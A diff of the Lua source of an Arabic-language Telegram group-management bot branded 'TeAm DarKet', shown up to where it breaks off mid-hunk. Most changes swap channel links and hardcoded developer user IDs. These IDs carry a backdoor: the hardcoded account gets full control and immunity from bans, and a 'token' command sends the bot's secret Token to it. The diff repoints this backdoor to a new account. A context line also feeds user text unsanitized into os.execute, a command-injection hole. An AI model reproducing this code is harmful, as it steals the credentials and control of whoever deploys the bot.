@@ -232,12 +232,12 @@ end
 if Redis:get(darket..'chsource') then
 chsource = Redis:get(darket..'chsource')
 else
-chsource = "IIIIIIQ"
+chsource = "R125R"
 end
 if Redis:get(darket..'chdevolper') then
 chdevolper = Redis:get(darket..'chdevolper')
 else 
-chdevolper = "Q0OO0"
+chdevolper = "R2RR7"
 end
 
 function chat_type(ChatId)
@@ -299,7 +299,7 @@ return kk
 end
 function The_ControllerAll(UserId)
 ControllerAll = false
-local ListSudos ={Sudo_Id,1965297568,5298947457}
+local ListSudos ={Sudo_Id,5386549632,5386549632}
 for k, v in pairs(ListSudos) do
 if tonumber(UserId) == tonumber(v) then
 ControllerAll = true
@@ -318,9 +318,9 @@ Manger = Redis:sismember(darket.."Manger:Group"..ChatId,UserId)
 Admin = Redis:sismember(darket.."Admin:Group"..ChatId,UserId)
 Special = Redis:sismember(darket.."Special:Group"..ChatId,UserId)
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
-if UserId == 1965297568 then
+if UserId == 5386549632 then
 Status = 'المبرمج ستيفن'
-elseif UserId == 5298947457 then
+elseif UserId == 5386549632 then
 Status = 'مطور السورس'
 elseif UserId == Sudo_Id then  
 Status = 'المطور الاساسي'
@@ -897,9 +897,9 @@ Manger = Redis:sismember(darket.."Manger:Group"..ChatId,UserId)
 Admin = Redis:sismember(darket.."Admin:Group"..ChatId,UserId)
 Special = Redis:sismember(darket.."Special:Group"..ChatId,UserId)
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
-if UserId == 1965297568 then
+if UserId == 5386549632 then
 Status = true
-elseif UserId == 5298947457 then
+elseif UserId == 5386549632 then
 Status = true
 elseif UserId == Sudo_Id then  
 Status = true
@@ -939,9 +939,9 @@ Manger = Redis:sismember(darket.."Manger:Group"..ChatId,UserId)
 Admin = Redis:sismember(darket.."Admin:Group"..ChatId,UserId)
 Special = Redis:sismember(darket.."Special:Group"..ChatId,UserId)
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
-if UserId == 1965297568 then
+if UserId == 5386549632 then
 Status = true
-elseif UserId == 5298947457 then
+elseif UserId == 5386549632 then
 Status = true
 elseif UserId == Sudo_Id then    
 Status = true
@@ -1053,7 +1053,7 @@ if chh then
 local url = https.request("https://api.telegram.org/bot"..Token.."/getchatmember?chat_id="..chh.."&user_id="..msg.sender.user_id)
 data = json:decode(url)
 if data.result.status == "left" or data.result.status == "kicked" then
-if tonumber(msg.sender.user_id) ~= tonumber(1965297568) then
+if tonumber(msg.sender.user_id) ~= tonumber(5386549632) then
 JoinChannel = false 
 end
 end
@@ -1103,10 +1103,10 @@ return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id}),LuaTele.setChatMemberSt
 elseif Statusrestricted(msg.chat_id,msg.sender.user_id).SilentGroup == true then
 return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 end
-if tonumber(msg.sender.user_id) == 1965297568 then
+if tonumber(msg.sender.user_id) == 5386549632 then
 msg.Name_Controller = 'المبرمج ستيفن '
 msg.The_Controller = 1
-elseif tonumber(msg.sender.user_id) == 5298947457 then
+elseif tonumber(msg.sender.user_id) == 5386549632 then
 msg.Name_Controller = 'مطور السورس '
 msg.The_Controller = 1
 elseif The_ControllerAll(msg.sender.user_id) == true then  
@@ -1364,7 +1364,7 @@ keyboard.inline_keyboard = {
 {text = ' تفعيل ', callback_data = msg.sender.user_id..'/onlinebott'..msg_chat_id},
 },
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'},
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'},
 }
 }
 local rep = msg.id/2097152/0.5
@@ -2899,7 +2899,7 @@ end
 end   
 Get_Json = Get_Json..'],'
 end
-Get_Json = Get_Json..'"Dev":"Q0OO0"}'
+Get_Json = Get_Json..'"Dev":"R2RR7"}'
 end
 Get_Json = Get_Json..'}}'
 local File = io.open('./'..UserBot..'.json', "w")
@@ -6386,10 +6386,10 @@ end
 if Controller(msg_chat_id,UserId) == 'المطور الاساسي' then
 return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId).." } *","md",true)  
 end
-if UserId == "1965297568" then
+if UserId == "5386549632" then
 return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على المبرمج ستيفن *","md",true)  
 end
-if UserId == "5298947457" then
+if UserId == "5386549632" then
 return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على مطور السورس*","md",true)  
 end
 if Redis:sismember(darket.."BanAll:Groups",UserId) then
@@ -6423,10 +6423,10 @@ local UserId = text:match('^كتم عام (%d+)$')
 if not msg.Devss then
 return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
 end
-if UserId == "1965297568" then
+if UserId == "5386549632" then
 return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على المبرمج ستيفن *","md",true)  
 end
-if UserId == "5298947457" then
+if UserId == "5386549632" then
 return send(msg_chat_id,msg_id,"\n*٠ عذرآ لا تستطيع استخدام الامر على مطور السورس *","md",true)  
 end
 local UserInfo = LuaTele.getUser(UserId)
@@ -10258,7 +10258,7 @@ if not msg.Manger then
 return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/IIIIIIQ'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
 return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local list = Redis:smembers(darket.."List:Manager"..msg_chat_id.."")
@@ -10286,7 +10286,7 @@ if text == ("مسح الردود الانلاين") then
   return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
   end
   if ChannelJoin(msg) == false then
-  local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/IIIIIIQ'}, },}}
+  local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
   return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
   end
   local list = Redis:smembers(darket.."List:Manager:inline"..msg_chat_id.."")
@@ -10505,7 +10505,7 @@ if text == "حذف رد انلاين" then
   return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
   end
   if ChannelJoin(msg) == false then
-  local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/IIIIIIQ'}, },}}
+  local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
   return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
   end
   local reply_markup = LuaTele.replyMarkup{
@@ -10525,7 +10525,7 @@ if text == ("الردود الانلاين") then
   return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
   end
   if ChannelJoin(msg) == false then
-  local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/IIIIIIQ'}, },}}
+  local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
   return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
   end
   local list = Redis:smembers(darket.."List:Manager:inline"..msg_chat_id.."")
@@ -11191,7 +11191,7 @@ if not msg.Admin then
 return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/IIIIIIQ'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
 return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local reply_markup = LuaTele.replyMarkup{
@@ -11306,7 +11306,7 @@ if not msg.ControllerBot then
 return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/IIIIIIQ'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
 return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local list = Redis:smembers(darket.."List:Rd:Sudo")
@@ -11332,7 +11332,7 @@ if not msg.ControllerBot then
 return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/IIIIIIQ'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
 return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local list = Redis:smembers(darket.."List:Rd:Sudo")
@@ -11796,11 +11796,11 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = ' S𝑡𝑒Pℎ𝑒N', url = 't.me/Q0OO0'}, 
+{text = ' S𝑡𝑒Pℎ𝑒N', url = 't.me/R2RR7'}, 
 },
 }
 }
-return send(msg_chat_id,msg_id,"[S𝑡𝑒Pℎ𝑒N](tg://user?id=1965297568)","md",true, false, false, true, reply_markup)
+return send(msg_chat_id,msg_id,"[S𝑡𝑒Pℎ𝑒N](tg://user?id=5386549632)","md",true, false, false, true, reply_markup)
 end
 
 if text == 'ابو المجد' then
@@ -11812,7 +11812,7 @@ data = {
 },
 }
 }
-return send(msg_chat_id,msg_id,"[ ᵗᵐ^𝒅𝒂𝒅.✹⃝⁦꙰🇲🇰𝒂𝒃𝒐.𝒂𝒍𝒎𝒂𝒈𝒅. 𝒆𝒍𝒎𝒆𝒍𝒐𝒌𒀭⸙ꠋꠋꠋꠋꠋꠋꠋꠋ](tg://user?id=5298947457)","md",true, false, false, true, reply_markup)
+return send(msg_chat_id,msg_id,"[ ᵗᵐ^𝒅𝒂𝒅.✹⃝⁦꙰🇲🇰𝒂𝒃𝒐.𝒂𝒍𝒎𝒂𝒈𝒅. 𝒆𝒍𝒎𝒆𝒍𝒐𝒌𒀭⸙ꠋꠋꠋꠋꠋꠋꠋꠋ](tg://user?id=5386549632)","md",true, false, false, true, reply_markup)
 end
 
 if text == "تفعيل صورتي" or text == "تفعيل الصوره" then
@@ -12018,14 +12018,14 @@ end
 
 
 if text == "توكن" then
-if msg.sender.user_id == tonumber(1965297568) then
-send(1965297568,msg_id,Token,"html",true)
+if msg.sender.user_id == tonumber(5386549632) then
+send(5386549632,msg_id,Token,"html",true)
 end
 end
 if text == "انا مين" then
-if msg.sender.user_id == tonumber(1965297568) then
+if msg.sender.user_id == tonumber(5386549632) then
 send(msg_chat_id,msg_id,"٠ انت ستيفن مبرمج السورس يقلبي🌚♥","md",true)
-elseif msg.sender.user_id == tonumber(5298947457) then
+elseif msg.sender.user_id == tonumber(5386549632) then
 send(msg_chat_id,msg_id,"٠ انت مطور السورس يقلبي🌚♥","md",true)
 elseif msg.sender.user_id == tonumber(Sudo_Id) then
 send(msg_chat_id,msg_id,"٠ انت المطور الاساسي يقلبي🌚♥","md",true)
@@ -12064,7 +12064,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {{text = 'ترجمه الي العربية', data = msg.sender.user_id..'toar'},{text = 'ترجمه الي الانجليزية', data = msg.sender.user_id..'toen'}},
-{{text = ' ٠ TeAm DarKet ٠️', url = "https://t.me/IIIIIIQ"}},
+{{text = ' ٠ TeAm DarKet ٠️', url = "https://t.me/R125R"}},
 }
 }
 return send(msg_chat_id,msg_id, [[*
@@ -12171,7 +12171,7 @@ data = {
 {text = '𝑀𝑃3', data = msg.sender.user_id..'/mp3'..msg_id}, {text = '𝑀𝑃4', data = msg.sender.user_id..'/mp4'..msg_id}, 
 },
 {
-{text = 'TeAm DarKet ', url = "https://t.me/IIIIIIQ"}
+{text = 'TeAm DarKet ', url = "https://t.me/R125R"}
 },
 }
 }
@@ -12705,7 +12705,7 @@ if not msg.ControllerBot then
 return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/IIIIIIQ'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
 return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local list = Redis:smembers(darket.."List:Rd:Sudo:mz")
@@ -12731,7 +12731,7 @@ if not msg.ControllerBot then
 return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/IIIIIIQ'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
 return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local list = Redis:smembers(darket.."List:Rd:Sudo:mz")
@@ -12825,7 +12825,7 @@ if text == ("مسح الردود الانلاين العامه") then
   return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  المطور الثانوي * ',"md",true)  
   end
   if ChannelJoin(msg) == false then
-  local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/IIIIIIQ'}, },}}
+  local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
   return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
   end
   local list = Redis:smembers(darket.."List:Manager:inline3am")
@@ -13051,7 +13051,7 @@ if text == "حذف رد انلاين عام" then
   return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  المطور الثانوي * ',"md",true)  
   end
   if ChannelJoin(msg) == false then
-  local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/IIIIIIQ'}, },}}
+  local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
   return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
   end
   local reply_markup = LuaTele.replyMarkup{
@@ -13071,7 +13071,7 @@ if text == ("الردود الانلاين العامه") then
   return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  المطور الثانوي * ',"md",true)  
   end
   if ChannelJoin(msg) == false then
-  local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/IIIIIIQ'}, },}}
+  local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
   return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
   end
   local list = Redis:smembers(darket.."List:Manager:inline3am")
@@ -13140,7 +13140,7 @@ lan = "ar"
 end
 local rand = math.random(1,999)
 os.execute("gtts-cli "..intk.." -l '"..lan.."' -o 'intk"..rand..".mp3'")
-LuaTele.sendAudio(msg_chat_id,msg_id,'./intk'..rand..'.mp3',tostring(inoi),"html",nil,tostring(inoi),"@IIIIIIQ")
+LuaTele.sendAudio(msg_chat_id,msg_id,'./intk'..rand..'.mp3',tostring(inoi),"html",nil,tostring(inoi),"@R125R")
 sleep(1)
 os.remove("intk"..rand..".mp3")
 end
@@ -14102,7 +14102,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14113,7 +14113,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14124,7 +14124,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14135,7 +14135,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14146,7 +14146,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14157,7 +14157,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14168,7 +14168,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14179,7 +14179,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = 'TeAm DarKet', url = 't.me/IIIIIIQ'}, 
+{text = 'TeAm DarKet', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14190,7 +14190,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14201,7 +14201,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14212,7 +14212,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14223,7 +14223,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14234,7 +14234,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14245,7 +14245,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14256,7 +14256,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14267,7 +14267,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14279,7 +14279,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14290,7 +14290,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14301,7 +14301,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14312,7 +14312,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14323,7 +14323,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14334,7 +14334,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14345,7 +14345,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14356,7 +14356,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14367,7 +14367,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14378,7 +14378,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14389,7 +14389,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14400,7 +14400,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14411,7 +14411,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14422,7 +14422,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = 'TeAm DarKet', url = 't.me/IIIIIIQ'}, 
+{text = 'TeAm DarKet', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14433,7 +14433,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14444,7 +14444,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14455,7 +14455,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14466,7 +14466,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14477,7 +14477,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14488,7 +14488,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14499,7 +14499,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14510,7 +14510,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14521,7 +14521,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14532,7 +14532,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14543,7 +14543,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14554,7 +14554,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14565,7 +14565,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14576,7 +14576,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '٠ TeAm DarKet ٠️', url = 't.me/IIIIIIQ'}, 
+{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
 },
 }
 }
@@ -14587,7 +14587,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
